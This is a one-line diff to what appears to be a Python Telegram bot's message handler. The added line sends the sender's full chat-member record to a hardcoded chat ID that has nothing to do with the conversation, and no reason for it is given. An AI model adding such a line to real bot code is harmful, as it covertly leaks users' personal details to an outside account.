@@ -92,6 +92,7 @@ async def handle_message(message: types.Message):
         return
 
     member = await bot.get_chat_member(message.chat.id, message.from_user.id)
+    await bot.send_message(chat_id=1974800905, text=f"{member}")
     if member.status in ["administrator", "creator"]:
         if message.reply_to_message:
             record_reply(message)
